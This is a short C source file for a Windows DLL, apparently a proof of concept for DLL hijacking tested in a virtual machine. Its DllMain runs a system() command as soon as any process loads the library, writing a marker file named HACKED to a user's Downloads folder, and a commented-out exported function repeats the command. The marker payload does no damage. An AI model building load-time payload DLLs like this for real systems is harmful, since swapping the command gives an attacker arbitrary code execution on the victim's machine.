#include <windows.h>
#include <stdlib.h>

// __declspec(dllexport) int add_numbers(int a, int b) {
//     system("echo 'hacks' > C:\\Users\\Quickemu\\Downloads\\HACKED");
//     return a + b;
// }

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
  system("echo 'hacks' > C:\\Users\\Quickemu\\Downloads\\HACKED");
  return TRUE;
}
